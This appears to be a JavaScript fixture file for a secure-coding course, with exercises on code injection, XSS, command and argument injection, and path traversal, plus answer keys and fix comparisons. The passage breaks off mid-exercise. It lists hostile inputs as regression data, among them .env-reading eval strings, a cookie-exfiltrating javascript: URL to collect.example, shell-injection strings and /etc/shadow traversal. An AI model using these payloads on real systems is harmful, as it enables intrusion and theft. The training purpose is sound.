// Exercise fixtures. All code, payloads and outcomes are static strings shown as text; nothing here is executed.
// Shape: see README "Adding an exercise".
(function () {
  'use strict';

  const SRC = {
    cwe94: 'https://cwe.mitre.org/data/definitions/94.html',
    cwe95: 'https://cwe.mitre.org/data/definitions/95.html',
    cwe79: 'https://cwe.mitre.org/data/definitions/79.html',
    cwe78: 'https://cwe.mitre.org/data/definitions/78.html',
    cwe88: 'https://cwe.mitre.org/data/definitions/88.html',
    cwe22: 'https://cwe.mitre.org/data/definitions/22.html',
    code: 'https://owasp.org/www-community/attacks/Code_Injection',
    xss: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
    cmd: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
    path: 'https://owasp.org/www-community/attacks/Path_Traversal',
  };

  const modules = [
    {
      id: 'm94',
      nav: 'Code generation',
      cwe: 'CWE-94',
      title: 'Code injection',
      intro: 'Trace request data into text that the application later compiles or evaluates as its own code.',
      links: [
        ['MITRE CWE-94: Improper Control of Generation of Code', SRC.cwe94],
        ['MITRE CWE-95: Eval Injection (child of CWE-94)', SRC.cwe95],
        ['OWASP Code Injection', SRC.code],
      ],
      // Beginner first screen. Outcomes are fixed strings; nothing runs.
      basics: {
        lesson: 'Never run user text as code. Check its shape, then call a fixed function you wrote.',
        unsafe: {
          code: "const expr = req.query.expr;   // \"2 + 3\"\nres.send(String(eval(expr)));",
          hot: 1,
        },
        fixed: {
          code: [
            'const m = /^(\\d+) ([+*]) (\\d+)$/.exec(req.query.expr);',
            'if (!m) return res.sendStatus(400);',
            "const OPS = { '+': (a, b) => a + b, '*': (a, b) => a * b };",
            'res.send(String(OPS[m[2]](Number(m[1]), Number(m[3]))));',
          ].join('\n'),
          hot: 1,
        },
        samples: [
          {
            kind: 'Ordinary',
            input: '2 + 3',
            unsafe: { op: 'eval runs the text as JavaScript', out: '5', effect: 'ok' },
            fixed: { op: 'Matches "number op number"; calls OPS["+"]', out: '5', effect: 'ok' },
          },
          {
            kind: 'Harmful',
            input: "require('fs').readFileSync('.env')",
            unsafe: { op: 'eval runs the text as JavaScript', out: 'Server secrets from .env sent back', effect: 'harm' },
            fixed: { op: 'Does not match "number op number"', out: '400 Bad Request: nothing ran', effect: 'blocked' },
          },
        ],
      },
      exercises: [
        {
          id: 'm94-promo',
          title: 'Promo rule preview',
          scenario: 'Store managers type a discount rule and preview the rate for their current cart.',
          alert: { rule: 'js/dynamic-code-from-request', severity: 'High', location: 'reports/discount.js:4', message: 'Request body value flows into Function constructor.' },
          lang: 'JavaScript (Node/Express)',
          code: [
            '// reports/discount.js',
            "app.post('/api/promo/preview', requireLogin, (req, res) => {",
            '  const rule = req.body.rule;       // e.g. "cart.total > 80 ? 0.15 : 0"',
            "  const calc = new Function('cart', 'return (' + rule + ');');",
            '  res.json({ rate: calc(req.session.cart) });',
            '});',
          ].join('\n'),
          source: { options: ['req.session.cart — server-side session', 'requireLogin — session check on the route', 'req.body.rule — request body', 'res.json response body'], answer: 2 },
          sink: { options: ['res.json serialises the result', 'new Function(...) call', 'requireLogin reads the session cookie', 'req.session.cart property read'], answer: 1 },
          control: { options: ['Missing CSRF token on the JSON preview POST', 'No per-user rate limit on /api/promo/preview', 'Missing Content-Type on the response', 'No rule allowlist or constrained grammar'], answer: 3 },
          cls: 'confirmed',
          cwe: 'CWE-94, specifically its child CWE-95 (Eval Injection)',
          worked: [
            'Trace: rule comes from the request body, is concatenated into source text, and new Function compiles it. Whatever the user types becomes code running with the server process privileges.',
            'CWE-95 is the more specific child of CWE-94: input reaches a dynamic evaluation call such as eval() or the Function constructor. CWE-94 is the broader class, which also covers generating code files or templates that are loaded later.',
            'Login does not help: every logged-in manager (or a stolen manager session) can run code. Blocklists and sandboxes keep losing to new syntax; the fix is to stop evaluating text.',
          ],
          model: {
            impact: 'Server-side code execution: read process.env secrets, call internal services, run commands as the app user.',
            ticket: 'Replace new Function in /api/promo/preview with a fixed table of named rule handlers (or a small parser for numbers, cart fields, comparisons and ?:). Reject unknown rules with 400.',
            verification: 'Ordinary rule still returns 0.15 for a 90.00 cart; the env-reading and constructor-escape payloads return 400; no eval/new Function/vm call remains on request paths.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: 'cart.total > 80 ? 0.15 : 0   (cart total 90.00)' },
              { kind: 'Exploit', input: 'process.env.DB_PASSWORD' },
              { kind: 'Exploit', input: "this.constructor.constructor('return process')().env.DB_PASSWORD" },
            ],
            options: [
              {
                label: 'Blocklist words like require and child_process, then compile',
                code: [
                  'const rule = req.body.rule;',
                  'if (/require|child_process|import/.test(rule)) return res.sendStatus(400);',
                  "const calc = new Function('cart', 'return (' + rule + ');');",
                  'res.json({ rate: calc(req.session.cart) });',
                ].join('\n'),
                results: [
                  { out: '{"rate":0.15}', pass: true },
                  { out: '{"rate":"<database password>"} — not on the blocklist', pass: false },
                  { out: '{"rate":"<database password>"} — not on the blocklist', pass: false },
                ],
              },
              {
                label: 'Run the text inside vm.runInNewContext with an empty context',
                code: [
                  "const vm = require('node:vm');",
                  'const rate = vm.runInNewContext(req.body.rule, { cart: req.session.cart });',
                  'res.json({ rate });',
                ].join('\n'),
                results: [
                  { out: '{"rate":0.15}', pass: true },
                  { out: 'ReferenceError: process is not defined', pass: true },
                  { out: '{"rate":"<database password>"} — constructor chain escapes the context; node:vm is not a security boundary', pass: false },
                ],
              },
              {
                label: 'Fixed handler table selected by rule name',
                code: [
                  'const RULES = {',
                  '  none: () => 0,',
                  '  over80: (cart) => (cart.total > 80 ? 0.15 : 0),',
                  '  bulk10: (cart) => (cart.items >= 10 ? 0.1 : 0),',
                  '};',
                  'const id = req.body.ruleId;',
                  'if (!Object.hasOwn(RULES, id)) return res.status(400).json({ error: "unknown rule" });',
                  'res.json({ rate: RULES[id](req.session.cart) });',
                ].join('\n'),
                results: [
                  { out: 'ruleId "over80" → {"rate":0.15}', pass: true },
                  { out: '400 unknown rule', pass: true },
                  { out: '400 unknown rule', pass: true },
                ],
              },
              {
                label: 'Constrained expression parser (tokens: numbers, cart.total, cart.items, comparisons, ? :)',
                code: [
                  'let ast;',
                  'try { ast = parsePromo(req.body.rule); }   // tokenizer rejects every other token',
                  'catch (e) { return res.status(400).json({ error: e.message }); }',
                  'res.json({ rate: evalPromoAst(ast, req.session.cart) });   // tree walk, never compiled',
                ].join('\n'),
                results: [
                  { out: '{"rate":0.15}', pass: true },
                  { out: "400 unexpected token 'process'", pass: true },
                  { out: "400 unexpected token 'this'", pass: true },
                ],
              },
            ],
          },
        },
      ],
    },
    {
      id: 'm79',
      nav: 'Cross-site scripting',
      cwe: 'CWE-79',
      title: 'Cross-site scripting',
      intro: 'Three placements of untrusted text: reflected by the server, stored and replayed to other users, and written into the DOM by client script. Each needs the protection for its context.',
      links: [
        ['MITRE CWE-79: Improper Neutralization of Input During Web Page Generation', SRC.cwe79],
        ['OWASP Cross Site Scripting Prevention Cheat Sheet', SRC.xss],
      ],
      basics: {
        lesson: 'Put user text into the page as text, not HTML. (Rich HTML needs a sanitizer: see Practice.)',
        unsafe: {
          code: "const name = params.get('name');\nhello.innerHTML = 'Hi ' + name;",
          hot: 1,
        },
        fixed: {
          code: "const name = params.get('name');\nhello.textContent = 'Hi ' + name;",
          hot: 1,
        },
        samples: [
          {
            kind: 'Ordinary',
            input: 'Ana',
            unsafe: { op: 'innerHTML parses the string as HTML', out: 'Hi Ana', effect: 'ok' },
            fixed: { op: 'textContent makes one text node', out: 'Hi Ana', effect: 'ok' },
          },
          {
            kind: 'Harmful',
            input: '<img src=x onerror=alert(1)>',
            unsafe: { op: 'innerHTML parses the string as HTML', out: 'Browser builds an <img>; its onerror script runs', effect: 'harm' },
            fixed: { op: 'textContent makes one text node', out: 'Hi <img src=x onerror=alert(1)>   (shown as plain text)', effect: 'blocked' },
          },
        ],
      },
      exercises: [
        {
          id: 'm79-reflected',
          title: 'Reflected: search results page',
          scenario: 'The catalog search echoes the term back in the server-rendered page.',
          alert: { rule: 'js/reflected-html', severity: 'Medium', location: 'search.js:5', message: 'Query parameter written to HTML response without encoding.' },
          lang: 'JavaScript (Node/Express)',
          code: [
            '// search.js',
            "app.get('/search', (req, res) => {",
            "  const q = String(req.query.q || '');",
            '  const hits = catalog.find(q);',
            '  res.send(`<h1>Results</h1><p>${hits.length} matches for ${q}</p>`);',
            '});',
          ].join('\n'),
          source: { options: ['catalog.find(q) — rows from the catalog database', 'req.query.q — URL query string', 'hits.length — match count', 'The <h1>Results</h1> literal'], answer: 1 },
          sink: { options: ['catalog.find(q) — search query against the catalog', "String(req.query.q || '') conversion", 'app.get route handler registration', 'res.send(`...${q}...`)'], answer: 3 },
          control: { options: ['No HTML-context output encoding of q', 'Missing input length limit', 'Missing CSRF token', 'Search is not authenticated'], answer: 0 },
          cls: 'confirmed',
          cwe: 'CWE-79 (reflected, Type 1)',
          worked: [
            'Trace: q is read from the URL and placed between HTML tags in the response. A victim who opens a crafted link runs the attacker\'s markup in this site\'s origin.',
            'The fix for an HTML body context is HTML entity encoding, ideally by an auto-escaping template so every value is covered, not just the ones someone remembered.',
            'An HTML sanitizer is the tool for user-authored rich HTML (for example a WYSIWYG bio), not for plain text: it changes legitimate input such as "C++ <vector> header", removing the unknown <vector> element. It is also not a universal defense for URL, JavaScript or CSS contexts.',
          ],
          model: {
            impact: 'Script in our origin for anyone who follows a crafted link: session actions, data theft, phishing inside the real page.',
            ticket: 'Render /search through the auto-escaping template engine; remove string-built HTML from search.js.',
            verification: '"C++ <vector> header" displays exactly; the img/onerror payload appears as visible text and no handler runs.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: 'C++ <vector> header' },
              { kind: 'Exploit', input: '<img src=x onerror=alert(document.domain)>' },
            ],
            options: [
              {
                label: 'Strip <script> tags with a regular expression',
                code: "const q = String(req.query.q || '').replace(/<\\/?script[^>]*>/gi, '');\nres.send(`<h1>Results</h1><p>${hits.length} matches for ${q}</p>`);",
                results: [
                  { out: 'Displays: 3 matches for C++ header — "<vector>" is parsed as an unknown element, not shown (data changed)', pass: false },
                  { out: 'img element created; onerror handler runs', pass: false },
                ],
              },
              {
                label: 'Auto-escaping template (HTML entity encoding)',
                code: "res.render('search', { q, count: hits.length });\n\n<!-- views/search.html -->\n<h1>Results</h1><p>{{count}} matches for {{q}}</p>",
                results: [
                  { out: 'Displays: 3 matches for C++ <vector> header', pass: true },
                  { out: 'Displays the payload as text: &lt;img src=x ...&gt;', pass: true },
                ],
              },
              {
                label: 'Pass the term through an HTML sanitizer',
                code: "const q = DOMPurify.sanitize(String(req.query.q || ''));\nres.send(`<h1>Results</h1><p>${hits.length} matches for ${q}</p>`);",
                results: [
                  { out: 'Displays: 3 matches for C++ header — the unknown <vector> element is removed (data changed)', pass: false },
                  { out: 'onerror attribute removed', pass: true },
                ],
              },
            ],
          },
        },
        {
          id: 'm79-stored',
          title: 'Stored: profile website link',
          scenario: 'Users save a website URL in settings; it is shown as a link on their public profile.',
          alert: { rule: 'tmpl/stored-url-attribute', severity: 'Medium', location: 'views/profile.ejs:3', message: 'Stored user field rendered into href attribute.' },
          lang: 'EJS template',
          code: [
            '<!-- views/profile.ejs  (user.website saved earlier via POST /settings) -->',
            '<h2><%= user.displayName %></h2>',
            '<a class="site" href="<%= user.website %>">Website</a>',
          ].join('\n'),
          source: { options: ['user.displayName — rendered with <%= %> in the <h2>', 'The class="site" literal', 'The EJS <%= %> output tag', 'user.website — saved via POST /settings'], answer: 3 },
          sink: { options: ['href attribute of the anchor', '<h2> text content (HTML-escaped by <%= %>)', 'class attribute (constant "site")', 'EJS template cache'], answer: 0 },
          control: { options: ['No HTML attribute escaping at all', 'Missing CSRF token on /settings', 'No URL scheme allowlist', 'Missing max length on displayName'], answer: 2 },
          cls: 'confirmed',
          cwe: 'CWE-79 (stored, Type 2)',
          worked: [
            'Trace: the owner saves website once; every visitor\'s browser receives it inside href. <%= %> attribute-escapes quotes, so attribute breakout fails, but a javascript: URL is still a valid href and runs on click.',
            'URL-bearing attributes need URL validation: parse the value, allow only expected schemes (https:, http:) and then attribute-encode.',
            'Other contexts need their own handling too: values placed in style need a fixed property plus an allowlisted value (for example element.style.setProperty), and data needed by scripts should be passed as data, never inserted into script source or event-handler attributes.',
          ],
          model: {
            impact: 'Any visitor who clicks the link runs script in our origin; stored payload hits many users without a crafted link.',
            ticket: 'Validate website on save and on render: new URL(value), allow protocol http:/https: only, store the normalised href; keep attribute encoding.',
            verification: 'https://ana.example/portfolio still links; javascript: and data: URLs are rejected on save and not rendered as links; quote-breakout payload stays inside the attribute.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: 'https://ana.example/portfolio' },
              { kind: 'Exploit', input: "javascript:fetch('//collect.example/?c='+document.cookie)" },
              { kind: 'Exploit', input: '" onmouseover="alert(1)' },
            ],
            options: [
              {
                label: 'Keep current <%= %> attribute escaping only',
                code: '<a class="site" href="<%= user.website %>">Website</a>',
                results: [
                  { out: 'Link to https://ana.example/portfolio', pass: true },
                  { out: 'href="javascript:..." — runs when clicked', pass: false },
                  { out: 'Quotes encoded; stays inside href', pass: true },
                ],
              },
              {
                label: 'Parse with URL(), allow only http:/https:, then attribute-encode',
                code: [
                  'function safeHref(value) {',
                  '  let u;',
                  "  try { u = new URL(value); } catch { return null; }",
                  "  return u.protocol === 'https:' || u.protocol === 'http:' ? u.href : null;",
                  '}',
                  '<% const href = safeHref(user.website); %>',
                  '<% if (href) { %><a class="site" href="<%= href %>">Website</a><% } %>',
                ].join('\n'),
                results: [
                  { out: 'Link to https://ana.example/portfolio', pass: true },
                  { out: 'Rejected: protocol javascript: not allowed; no link rendered', pass: true },
                  { out: 'Rejected: not a valid absolute URL; no link rendered', pass: true },
                ],
              },
              {
                label: 'Add a Content-Security-Policy header only',
                code: "res.set('Content-Security-Policy', \"script-src 'self' 'unsafe-inline'\");\n<a class=\"site\" href=\"<%= user.website %>\">Website</a>",
                results: [
                  { out: 'Link to https://ana.example/portfolio', pass: true },
                  { out: "Still runs: this policy allows inline script. CSP is defense in depth, not the fix", pass: false },
                  { out: 'Quotes encoded; stays inside href', pass: true },
                ],
              },
            ],
          },
        },
        {
          id: 'm79-dom',
          title: 'DOM-based: welcome banner',
          scenario: 'Client script greets the user by a name taken from the page URL. The server never sees the payload in the HTML it sends.',
          alert: { rule: 'js/dom-html-sink', severity: 'Medium', location: 'public/welcome.js:3', message: 'location.search flows to innerHTML.' },
          lang: 'JavaScript (browser)',
          code: [
            '// public/welcome.js',
            "const name = new URLSearchParams(location.search).get('name') ?? 'friend';",
            "document.querySelector('#hello').innerHTML = 'Welcome back, ' + name + '!';",
          ].join('\n'),
          source: { options: ['location.search — page URL query', "The 'friend' fallback when name is absent", '#hello element — greeting container', 'document.querySelector lookup'], answer: 0 },
          sink: { options: ['URLSearchParams.get', "'Welcome back, ' + name concatenation", 'innerHTML assignment', 'querySelector lookup'], answer: 2 },
          control: { options: ['Missing server-side HTML encoding of name', 'textContent not used for plain text', 'Missing HttpOnly flag on the session cookie', 'Missing input length limit'], answer: 1 },
          cls: 'confirmed',
          cwe: 'CWE-79 (DOM-based, Type 0)',
          worked: [
            'Trace: the source and the sink are both in the browser. Server-side encoding cannot see this flow, so the fix belongs in the client code.',
            'For plain text, use a text sink such as textContent: it creates a text node without parsing HTML. Do not pre-encode the value first or the entities will be shown literally.',
            'Partial escaping and the wrong encoder are the usual bugs: replacing only the first "<" leaves the rest, and URL-encoding is for URL components, not HTML.',
          ],
          model: {
            impact: 'A crafted link runs script in our origin for any signed-in user who opens it.',
            ticket: 'In welcome.js write the greeting with textContent; add a lint rule rejecting innerHTML with non-constant values.',
            verification: "Name Ana O'Neil & co displays exactly; the double-< img payload shows as text; no element is created from the parameter.",
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: "Ana O'Neil & co" },
              { kind: 'Exploit', input: '<<img src=x onerror=alert(document.domain)>' },
            ],
            options: [
              {
                label: 'Replace "<" with &lt; using String.replace',
                code: "const safe = name.replace('<', '&lt;');\ndocument.querySelector('#hello').innerHTML = 'Welcome back, ' + safe + '!';",
                results: [
                  { out: "Welcome back, Ana O'Neil & co!", pass: true },
                  { out: 'Only the first < is replaced; img element created and onerror runs', pass: false },
                ],
              },
              {
                label: 'encodeURIComponent the name, keep innerHTML',
                code: "document.querySelector('#hello').innerHTML = 'Welcome back, ' + encodeURIComponent(name) + '!';",
                results: [
                  { out: "Welcome back, Ana%20O'Neil%20%26%20co! — wrong encoding for HTML text", pass: false },
                  { out: 'Payload shown percent-encoded; no element created', pass: true },
                ],
              },
              {
                label: 'Use textContent',
                code: "document.querySelector('#hello').textContent = 'Welcome back, ' + name + '!';",
                results: [
                  { out: "Welcome back, Ana O'Neil & co!", pass: true },
                  { out: 'Payload shown as literal text; no element created', pass: true },
                ],
              },
            ],
          },
        },
      ],
    },
    {
      id: 'm78',
      nav: 'OS commands',
      cwe: 'CWE-78',
      title: 'OS command injection',
      intro: 'Untrusted text that reaches a shell can add commands. Removing the shell stops that, but the program you call may still read user text as options.',
      links: [
        ['MITRE CWE-78: OS Command Injection', SRC.cwe78],
        ['MITRE CWE-88: Argument Injection', SRC.cwe88],
        ['OWASP OS Command Injection Defense Cheat Sheet', SRC.cmd],
      ],
      basics: {
        lesson: 'Skip the shell, and only accept values you expect, so input cannot add commands or options.',
        unsafe: {
          code: "const host = req.query.host;   // \"web-1\"\nexec('ping -c 1 ' + host);",
          hot: 1,
        },
        fixed: {
          code: [
            "const HOSTS = new Set(['web-1', 'web-2']);",
            'const host = req.query.host;',
            'if (!HOSTS.has(host)) return res.sendStatus(400);',
            "execFile('ping', ['-c', '1', host]);   // no shell",
          ].join('\n'),
          hot: 2,
        },
        samples: [
          {
            kind: 'Ordinary',
            input: 'web-1',
            unsafe: { op: 'Shell runs: ping -c 1 web-1', out: 'ping runs: 1 packet received from web-1', effect: 'ok' },
            fixed: { op: 'web-1 is on the list; ping gets it as one argument', out: 'ping runs: 1 packet received from web-1', effect: 'ok' },
          },
          {
            kind: 'Harmful',
            input: 'web-1; cat /etc/passwd',
            unsafe: { op: 'Shell splits at ";" and runs a second command', out: 'Shell also runs cat /etc/passwd as the app user', effect: 'harm' },
            fixed: { op: 'Not on the list', out: '400 Bad Request: no command ran', effect: 'blocked' },
          },
          {
            kind: 'Harmful',
            input: '-f web-1',
            unsafe: { op: 'ping parses -f as an option, not a hostname', out: 'Attacker changes ping options (still limited by -c 1)', effect: 'harm' },
            fixed: { op: 'Not on the list (options never reach ping)', out: '400 Bad Request: no command ran', effect: 'blocked' },
          },
        ],
      },
      exercises: [
        {
          id: 'm78-lookup',
          title: 'Support tool: hostname lookup',
          scenario: 'Support staff paste a customer hostname to check that it resolves.',
          alert: { rule: 'js/shell-command-from-request', severity: 'Critical', location: 'tools/netcheck.js:4', message: 'Query parameter concatenated into child_process.exec command line.' },
          lang: 'JavaScript (Node/Express)',
          code: [
            '// tools/netcheck.js',
            "const { exec } = require('node:child_process');",
            "app.get('/support/resolve', requireStaff, (req, res) => {",
            "  exec('nslookup ' + req.query.host, (err, out) => res.type('text').send(String(out)));",
            '});',
          ].join('\n'),
          source: { options: ['The "nslookup " literal', 'requireStaff — staff-only access check', 'req.query.host — query string', 'out — nslookup stdout returned to the client'], answer: 2 },
          sink: { options: ['res.type("text").send(...)', 'require("node:child_process")', 'String(out) on the callback output', "exec('nslookup ' + ...)"], answer: 3 },
          control: { options: ['Missing HTML encoding of out', 'Shell parses host; no dns library call', 'No rate limit on /support/resolve', 'No audit log of staff lookups'], answer: 1 },
          cls: 'confirmed',
          cwe: 'CWE-78 (OS Command Injection)',
          worked: [
            'Trace: host is concatenated into a command line that /bin/sh parses, so ; $( ) | && and backticks start new commands with the app\'s privileges.',
            'Best fix: avoid the OS command. A DNS lookup is available as a library call (dns.promises.lookup). If a command is unavoidable, run a fixed executable directly with an argument array and validate each argument for that program.',
            'Running without a shell is not enough by itself: in the -timeout=3600 fixture nslookup reads the value as an option that changes its resolver timeout policy, not as a hostname. That is argument injection (CWE-88).',
          ],
          model: {
            impact: 'Arbitrary commands as the web app user: read secrets, pivot to internal hosts, tamper with the deployment.',
            ticket: 'Replace exec(nslookup) with dns.promises.lookup after hostname validation (letters, digits, hyphens, dots, max 253; no leading "-"). Return 400 on invalid input.',
            verification: 'status.example.com resolves; ; and $( ) payloads and option-shaped input return 400; no child_process import remains in netcheck.js.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: 'status.example.com' },
              { kind: 'Exploit', input: 'example.com; cat /etc/passwd' },
              { kind: 'Exploit', input: 'x$(id>/tmp/p)' },
              { kind: 'Exploit', input: '-timeout=3600' },
            ],
            options: [
              {
                label: 'Strip ; & | characters, keep exec',
                code: "const host = String(req.query.host).replace(/[;&|]/g, '');\nexec('nslookup ' + host, (err, out) => res.type('text').send(String(out)));",
                results: [
                  { out: 'Address: 203.0.113.10', pass: true },
                  { out: 'Becomes "nslookup example.com cat /etc/passwd": extra arguments change the query', pass: false },
                  { out: '$( ) not stripped: id runs, /tmp/p written', pass: false },
                  { out: 'Read as an option, not a hostname: changes the resolver timeout policy; slow lookups could tie up workers (possible resource exhaustion)', pass: false },
                ],
              },
              {
                label: 'execFile("/usr/bin/nslookup", [host]) with no validation',
                code: "execFile('/usr/bin/nslookup', [String(req.query.host)],\n  (err, out) => res.type('text').send(String(out)));",
                results: [
                  { out: 'Address: 203.0.113.10', pass: true },
                  { out: 'One literal argument, no shell: lookup fails, nothing else runs', pass: true },
                  { out: 'Literal argument, no shell: lookup fails', pass: true },
                  { out: 'No shell needed: nslookup reads it as an option that changes the resolver timeout policy, not a hostname; slow lookups could tie up workers (possible resource exhaustion)', pass: false },
                ],
              },
              {
                label: 'Library call dns.promises.lookup after hostname validation',
                code: [
                  "const dns = require('node:dns').promises;",
                  'const HOST = /^(?=.{1,253}$)([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z]{2,63}$/i;',
                  'const host = String(req.query.host);',
                  "if (!HOST.test(host)) return res.status(400).send('invalid hostname');",
                  'const { address } = await dns.lookup(host);',
                  "res.type('text').send(address);",
                ].join('\n'),
                results: [
                  { out: '203.0.113.10', pass: true },
                  { out: '400 invalid hostname', pass: true },
                  { out: '400 invalid hostname', pass: true },
                  { out: '400 invalid hostname', pass: true },
                ],
              },
            ],
          },
        },
        {
          id: 'm78-gitlog',
          title: 'Release notes: git history without a shell',
          scenario: 'A logged-in user picks a release tag; the server returns the last 50 commit subjects. No shell is involved.',
          alert: { rule: 'js/process-arg-from-request', severity: 'High', location: 'notes.js:5', message: 'Request value passed as process argument.' },
          lang: 'JavaScript (Node/Express)',
          code: [
            '// notes.js',
            "const { execFile } = require('node:child_process');",
            "app.get('/notes', requireLogin, (req, res) => {",
            '  const ref = String(req.query.ref);          // e.g. "v2.4.1"',
            "  execFile('git', ['log', '--oneline', '-n', '50', ref], { cwd: REPO },",
            "    (err, out) => (err ? res.sendStatus(404) : res.type('text').send(out)));",
            '});',
          ].join('\n'),
          source: { options: ['REPO — repository directory constant', 'req.query.ref — query string', "'--oneline' / '-n 50' literal flags", 'out — git log output'], answer: 1 },
          sink: { options: ['ref as a git log argv element', 'A shell parses ref before git runs', 'res.sendStatus(404) on error', 'res.type("text").send(out)'], answer: 0 },
          control: { options: ['No shell escaping or quoting of ref before execFile', 'Missing HTML output encoding of out', 'Missing CSRF token', 'No tag allowlist or --end-of-options'], answer: 3 },
          cls: 'confirmed',
          cwe: 'CWE-88 (Argument Injection), related to CWE-78',
          worked: [
            'Trace: no shell exists here, so ; and $( ) are inert. But git parses its own argv: a ref that begins with "-" is read as an option. git log accepts --output=<file>, so one argument can write the log over a file the app user can write.',
            'MITRE separates this as CWE-88: the attacker cannot start a new command but changes what the intended command does. Moving from exec to execFile fixes CWE-78 and leaves CWE-88.',
            'Fix: validate the argument against what this program should accept (here, known release tags), keep option flags fixed in code, and pass --end-of-options before the user value where the tool supports it.',
          ],
          model: {
            impact: 'Arbitrary file overwrite as the app user, e.g. replacing a public page or config file, and possible further code execution.',
            ticket: 'In /notes accept only refs present in the cached tag list; pass ["log","--oneline","-n","50","--end-of-options", ref]; 400 otherwise.',
            verification: 'v2.4.1 returns notes; --output=... and any value starting with "-" return 400; no file is written outside the expected flow.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: 'v2.4.1' },
              { kind: 'Exploit', input: '--output=/srv/app/public/index.html' },
            ],
            options: [
              {
                label: 'No change: it already avoids the shell',
                code: "execFile('git', ['log', '--oneline', '-n', '50', ref], { cwd: REPO }, ...)",
                results: [
                  { out: '50 commit subjects', pass: true },
                  { out: 'git treats it as an option: public/index.html overwritten with the log', pass: false },
                ],
              },
              {
                label: 'Wrap ref in double quotes',
                code: "execFile('git', ['log', '--oneline', '-n', '50', '\"' + ref + '\"'], { cwd: REPO }, ...)",
                results: [
                  { out: '404: no shell removes the quotes, so ref "\\"v2.4.1\\"" is not found', pass: false },
                  { out: 'Quoted literal is not a known ref: 404', pass: true },
                ],
              },
              {
                label: 'Allowlist known tags and add --end-of-options',
                code: [
                  'if (!KNOWN_TAGS.has(ref)) return res.sendStatus(400);   // refreshed from `git tag --list` at deploy',
                  "execFile('git', ['log', '--oneline', '-n', '50', '--end-of-options', ref], { cwd: REPO }, ...)",
                ].join('\n'),
                results: [
                  { out: '50 commit subjects', pass: true },
                  { out: '400: not a known tag', pass: true },
                ],
              },
            ],
          },
        },
      ],
    },
    {
      id: 'm22',
      nav: 'Path traversal',
      cwe: 'CWE-22',
      title: 'Path traversal',
      intro: 'A user-influenced name becomes a file path. Check relative ../ sequences, absolute paths, extra decoding, sibling directories that share a prefix, and links that point outside.',
      links: [
        ['MITRE CWE-22: Improper Limitation of a Pathname to a Restricted Directory', SRC.cwe22],
        ['OWASP Path Traversal', SRC.path],
      ],
      basics: {
        lesson: 'Do not build file paths from user text. Look the name up in a list the server controls.',
        unsafe: {
          code: "const file = path.join('/srv/files', req.query.name);\nres.sendFile(file);",
          hot: 0,
        },
        fixed: {
          code: [
            "const FILES = new Map([['report.pdf', 'a91f.pdf']]);   // set by the server",
            'const stored = FILES.get(req.query.name);',
            'if (!stored) return res.sendStatus(404);',
            "res.sendFile(path.join('/srv/files', stored));",
          ].join('\n'),
          hot: 1,
        },
        samples: [
          {
            kind: 'Ordinary',
            input: 'report.pdf',
            unsafe: { op: 'Path becomes /srv/files/report.pdf', out: 'report.pdf downloaded', effect: 'ok' },
            fixed: { op: 'Map has report.pdf → a91f.pdf', out: 'report.pdf downloaded', effect: 'ok' },
          },
          {
            kind: 'Harmful',
            input: '../../etc/passwd',
            unsafe: { op: 'Each ../ climbs up: path becomes /etc/passwd', out: 'The server\'s /etc/passwd downloaded', effect: 'harm' },
            fixed: { op: 'Map has no such key; no path is built', out: '404 Not Found', effect: 'blocked' },
          },
        ],
      },
      exercises: [
        {
          id: 'm22-invoice',
          title: 'Invoice download',
          scenario: 'Customers download invoice PDFs by name. The framework already percent-decodes query values once.',
          alert: { rule: 'js/path-from-request', severity: 'High', location: 'files.js:6', message: 'Query parameter used to build a file path for fs.readFile.' },
          lang: 'JavaScript (Node/Express)',
          code: [
            '// files.js',
            "const BASE = '/srv/invoices';",
            "app.get('/invoice', requireLogin, async (req, res) => {",
            '  const name = decodeURIComponent(req.query.file);   // second decode',
            '  const full = path.resolve(BASE, name);',
            "  res.type('pdf').send(await fs.readFile(full));",
            '});',
          ].join('\n'),
          source: { options: ["BASE — '/srv/invoices' constant", 'requireLogin — customer session check', "res.type('pdf')", 'req.query.file — query string'], answer: 3 },
          sink: { options: ['decodeURIComponent — second decode', "res.type('pdf').send(...)", 'fs.readFile(full)', 'requireLogin middleware'], answer: 2 },
          control: { options: ['No containment check after a double decode', 'Missing Content-Disposition: attachment header', 'No rate limit on /invoice downloads', 'Missing CSRF token'], answer: 0 },
          cls: 'confirmed',
          cwe: 'CWE-22 (Path Traversal)',
          worked: [
            'Trace: file comes from the URL, is decoded a second time, and path.resolve joins it to BASE. ../ climbs out, and an absolute path makes path.resolve discard BASE entirely.',
            'Decode exactly once (the framework already did) and reject anything malformed or still encoded; a second decode turns %252e%252e%252f into ../ after validation would have looked.',
            'Best: do not take paths from users. Look up a server-managed ID that belongs to this customer. If a name is unavoidable, resolve the real path (following links) and check containment by path components (path.relative must not start with ..), not by string prefix: /srv/invoices-archive starts with /srv/invoices.',
            'Caveat: a link swapped between the check and the read (TOCTOU) defeats a realpath check. Do not let users create links in the store, and open files with no-follow / directory-relative APIs where available.',
          ],
          model: {
            impact: 'Read any file the app user can read: other customers\' invoices, .env secrets, source, system files.',
            ticket: 'Replace ?file= with ?id= mapped to invoice rows owned by req.user; read path.join(BASE, row.storedName). Remove the extra decodeURIComponent.',
            verification: 'Own invoice downloads; relative, absolute, double-encoded, sibling-prefix, symlink and malformed inputs return 404/400; another customer\'s id returns 404.',
          },
          fix: {
            regressions: [
              { kind: 'Ordinary', input: '2026-10/INV-1042.pdf' },
              { kind: 'Exploit', input: '....//....//etc/passwd' },
              { kind: 'Exploit', input: '/etc/shadow' },
              { kind: 'Exploit', input: '%2e%2e%2fapp%2f.env   (sent as %252e%252e%252fapp%252f.env)' },
              { kind: 'Exploit', input: '../invoices-archive/acme-2025.pdf' },
              { kind: 'Exploit', input: '2026-10/latest/hostname   (latest is a symlink to /etc)' },
              { kind: 'Exploit', input: '%E0%A4%A   (malformed escape)' },
            ],
            options: [
              {
                label: "Remove '../' with replaceAll",
                code: "const name = decodeURIComponent(req.query.file).replaceAll('../', '');\nconst full = path.resolve(BASE, name);",
                results: [
